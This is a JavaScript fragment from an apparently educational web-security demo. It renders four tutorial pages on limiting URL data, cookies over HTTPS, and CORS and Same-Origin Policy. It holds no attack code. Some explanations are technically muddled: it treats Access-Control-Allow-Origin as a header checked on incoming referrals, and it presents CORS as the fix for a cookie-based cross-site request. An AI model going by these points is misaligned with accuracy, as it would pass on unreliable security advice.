              content.innerHTML = '-->Referral Safety - Limiting URLs 1<br><br>As you might have seen in the Network Sniffing attack, data has to be sent back from a user-client to the server to be processed. Often this data is private and we do not want it to be seen by others too easily so safety in how its sent is important.<br><br>We saw that pass-the-hash attacks and reading URLs can allow malicious users wrongful access. Some mitigation of this can be done by restricting data returned via URL. Moreover this limits the amount of places for user input - restricting A03 Injection attacks.';
            } else if (page == 1) {
              document.getElementById("prev-button-def").style.display = 'block';
              document.getElementById("next-button-def").style.display = 'block';
              content.innerHTML = '-->Referral Safety - Limiting URLs 2<br><br>If we send less information in the URL, there is more data to send in other ways. A good user-specific way to collect, store and send this data is via Cookies, a set of items that describe your internet session and connection to that site.<br><br>In the case of this site, cookies are used to take note of which user is logged in and also passing back the defence settings the user has decided upon.<br><br>These pieces of data are embedded into the packets sent over the internet. This allows us to make this information harder to see or change for a malicious listener, especially because encrypting can now be applied via HTTPS.';
            } else if (page == 2) {
              document.getElementById("prev-button-def").style.display = 'block';
              document.getElementById("next-button-def").style.display = 'block';
              content.innerHTML = '-->Referral Safety - CORS 1<br><br>A separate issue that applies to URLs and website referral is management of CORS - Cross-Origin Resource Sharing. Our Origin Policy describes how our website interacts with other domains in terms of resources shared. <br><br>The ability of other domains to execute actions via referring us to a URL requires strict control to ensure malicious action is not taken, such as the Cross-Origin Access attack discussed. This attack took advantage of a user’s stored cookies to make a comment as them using a URL link, and can be stopped by blocklisting this websites referral ability. Naturally this also means limiting URL functionality and employing an Origin Policy go hand in hand.';
            } else if (page == 3) {
              document.getElementById("prev-button-def").style.display = 'block';
              document.getElementById("next-button-def").style.display = 'none';
              content.innerHTML = '-->Referral Safety - CORS 2<br><br>There is nuance to our access control choices. If we employ Same-Origin Policy (SOP), then we can only use links from within our own site, this employs maximum security but reduces functionality. Relaxing SOP allows us to linked to from other <u>trusted</u> sites. <br><br>We must strictly manage which sites we place on an allowlist or blocklist, perhaps only accepting ourselves and a few other known sites. Checking the referrer for this function is done by checking the Access-Control-Allow-Origin header against our detailed list, throwing a 403 error if disallowed.';
            }
          }
        }
        refreshProtections();
      }

